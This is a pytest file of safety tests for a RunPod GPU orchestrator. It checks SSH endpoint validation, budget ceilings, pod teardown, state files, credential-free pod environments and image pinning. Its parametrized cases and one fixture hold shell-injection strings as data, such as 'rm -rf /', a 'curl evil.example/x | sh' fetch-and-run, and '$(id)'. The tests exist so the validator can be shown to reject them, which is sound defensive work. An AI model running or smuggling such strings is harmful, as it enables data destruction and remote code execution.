"""Safety tests for the RunPod orchestrator.

These cover the controls that stand between an unsupervised run and either a
runaway bill or a shell injection. None of them provisions anything.
"""
from __future__ import annotations

import json
from unittest.mock import patch

import pytest

from scripts.phase0.runpod_provision import validate_ssh_endpoint


class TestValidateSshEndpoint:
    """publicIp and portMappings come from a remote API and reach shell=True."""

    def test_accepts_a_normal_endpoint(self) -> None:
        assert validate_ssh_endpoint("203.0.113.7", 22041) == ("203.0.113.7", 22041)

    def test_accepts_ipv6(self) -> None:
        ip, port = validate_ssh_endpoint("2001:db8::1", 22)
        assert port == 22

    @pytest.mark.parametrize("hostile", [
        "203.0.113.7; rm -rf /",
        "203.0.113.7 && curl evil.example/x | sh",
        "$(id)",
        "`id`",
        "203.0.113.7'\"",
        "evil.example.com",
        "",
    ])
    def test_rejects_anything_that_is_not_an_address(self, hostile: str) -> None:
        with pytest.raises(ValueError, match="not an IP address"):
            validate_ssh_endpoint(hostile, 22)

    @pytest.mark.parametrize("port", [0, -1, 65536, 999999])
    def test_rejects_out_of_range_ports(self, port: int) -> None:
        with pytest.raises(ValueError, match="out-of-range SSH port"):
            validate_ssh_endpoint("203.0.113.7", port)


class TestBudgetGate:
    """The $1000 ceiling used to exist only in prose."""

    def test_refuses_a_fleet_that_would_exceed_the_budget(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        # $50/hr/pod x 5 pods x 6h = $1500, over the $1000 budget.
        with patch.object(rp, "get_gpu_price", return_value=50.0):
            with pytest.raises(RuntimeError, match="Refusing to provision"):
                rp._check_budget("NVIDIA H100 80GB HBM3", 5)

    def test_allows_a_fleet_within_the_budget(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        with patch.object(rp, "get_gpu_price", return_value=3.0):
            budget = rp._check_budget("NVIDIA H100 80GB HBM3", 5)
        assert budget["usd_per_hour_per_pod"] == 3.0
        assert budget["fleet_usd_per_hour"] == 15.0
        # Priced against the wall time the timeouts actually permit, not the
        # declared cap: the gate was unreachable when priced on MAX_RUN_HOURS.
        assert budget["worst_case_usd"] == pytest.approx(15.0 * budget["reachable_hours"])
        assert budget["reachable_hours"] > rp.MAX_RUN_HOURS
        assert budget["worst_case_usd"] <= budget["budget_usd"]

    def test_unknown_price_is_not_treated_as_free(self) -> None:
        from scripts.phase0 import runpod_provision as rpp

        with patch.object(rpp, "_gql", return_value={"gpuTypes": [{"lowestPrice": {}}]}):
            with pytest.raises(RuntimeError, match="no on-demand price"):
                rpp.get_gpu_price("NVIDIA H100 80GB HBM3")

    def test_price_ceiling_rejects_an_expensive_part(self) -> None:
        """The old fallback was largest-VRAM-wins, at any price."""
        from scripts.phase0 import runpod_provision as rpp

        gpus = [{"id": "SOME-GIANT-GPU", "memoryInGb": 192, "communityCloud": True}]
        with patch.object(rpp, "list_available_gpus", return_value=gpus), \
                patch.object(rpp, "get_gpu_price", return_value=99.0):
            with pytest.raises(RuntimeError, match="within \\$12"):
                rpp.find_fastest_available(min_vram_gb=48, max_usd_per_hour=12.0)


class TestTeardownIsScoped:

    def test_terminate_pods_reports_failures_and_continues(self) -> None:
        """One unreachable pod must not strand the rest."""
        from scripts.phase0 import runpod_provision as rpp

        killed: list[str] = []

        def _terminate(pod_id: str) -> None:
            if pod_id == "bad":
                raise RuntimeError("api down")
            killed.append(pod_id)

        with patch.object(rpp, "terminate_pod", side_effect=_terminate):
            failed = rpp.terminate_pods(["a", "bad", "c"])

        assert killed == ["a", "c"]
        assert failed == ["bad"]

    def test_teardown_keeps_state_when_a_pod_survives(self, tmp_path) -> None:
        """The state file is the only local record of what is still billing."""
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}],
            "meta": {"state": "running"},
        }))

        with patch.object(rp, "POD_STATE_FILE", state_file), \
                patch.object(rp, "terminate_pods", return_value=["p1"]):
            with pytest.raises(RuntimeError, match="still billing"):
                rp.teardown()

        assert state_file.exists(), "state file must survive a failed teardown"
        assert json.loads(state_file.read_text())["meta"]["still_running"] == ["p1"]

    def test_teardown_removes_state_on_success(self, tmp_path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}],
            "meta": {},
        }))

        with patch.object(rp, "POD_STATE_FILE", state_file), \
                patch.object(rp, "terminate_pods", return_value=[]):
            rp.teardown()

        assert not state_file.exists()


class TestPodState:

    def test_reads_the_legacy_bare_list_format(self, tmp_path) -> None:
        """An older state file must still be readable, to tear its pods down."""
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps(
            [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}]
        ))
        with patch.object(rp, "POD_STATE_FILE", state_file):
            assert len(rp._read_pod_state()["pods"]) == 1

    def test_load_revalidates_endpoints_from_disk(self, tmp_path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "evil; rm -rf /", "port": 22, "role": "A"}],
            "meta": {},
        }))
        with patch.object(rp, "POD_STATE_FILE", state_file):
            with pytest.raises(ValueError, match="not an IP address"):
                rp._load_pod_state()


class TestNoCredentialsOnPods:

    def test_pod_env_ships_no_secrets(self) -> None:
        """The fold needs none: the base model is public and WandB is disabled."""
        from scripts.phase1b import runpod_parallel as rp

        env = rp._get_pod_env()
        assert "HF_TOKEN" not in env
        assert "WANDB_API_KEY" not in env
        for key, value in env.items():
            assert "token" not in value.lower(), f"{key} looks like a credential"
        # HF cache belongs on the volume, not the container disk.
        assert env["HF_HOME"].startswith("/workspace/")


class TestImagePinning:

    def test_image_is_digest_pinned(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        assert "@sha256:" in rp.DOCKER_IMAGE, (
            "a mutable tag lets the image change under the run"
        )
